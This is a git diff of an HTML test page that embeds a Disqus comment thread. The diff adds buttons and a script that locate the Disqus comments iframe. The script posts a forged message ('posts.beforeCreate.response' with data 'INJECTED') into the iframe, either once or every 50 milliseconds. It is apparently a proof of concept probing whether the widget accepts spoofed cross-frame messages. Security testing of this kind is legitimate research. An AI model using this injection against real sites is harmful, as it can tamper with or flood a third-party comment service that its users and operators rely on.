@@ -3,10 +3,19 @@
 <head><meta charset="utf-8"><title>embed test</title></head>
 <body>
 <h1>embed test</h1>
+
+<div style="padding:12px;border:2px solid #c00;margin-bottom:16px;font-family:monospace">
+  <button id="fire">fire once</button>
+  <button id="spam">start spam</button>
+  <button id="stop">stop spam</button>
+  <span id="status">idle</span>
+</div>
+
 <div id="disqus_thread"></div>
+
 <script>
 var disqus_config = function () {
-  this.page.url = "https://du4l5ynche1n.github.io/missing-coop/";
+  this.page.url = "https://du4l5ynche1n.github.io/missing-coop/disqus.html";
   this.page.identifier = "test-1";
 };
 (function() {
@@ -15,6 +24,40 @@ var disqus_config = function () {
   s.setAttribute('data-timestamp', +new Date());
   (d.head || d.body).appendChild(s);
 })();
+</script>
+
+<script>
+var timer = null;
+
+function getFrame() {
+  return document.querySelector('iframe[src*="disqus.com/embed/comments"]');
+}
+
+function inject() {
+  var f = getFrame();
+  if (!f) { document.getElementById('status').textContent = 'frame not found'; return; }
+  f.contentWindow.postMessage(JSON.stringify({
+    scope: "client",
+    name: "posts.beforeCreate.response",
+    data: "INJECTED"
+  }), "*");
+}
+
+document.getElementById('fire').onclick = function() {
+  inject();
+  document.getElementById('status').textContent = 'fired @ ' + new Date().toISOString();
+};
+
+document.getElementById('spam').onclick = function() {
+  if (timer) return;
+  timer = setInterval(inject, 50);
+  document.getElementById('status').textContent = 'spamming every 50ms';
+};
+
+document.getElementById('stop').onclick = function() {
+  clearInterval(timer); timer = null;
+  document.getElementById('status').textContent = 'stopped';
+};
 </script>
 </body>
 </html>
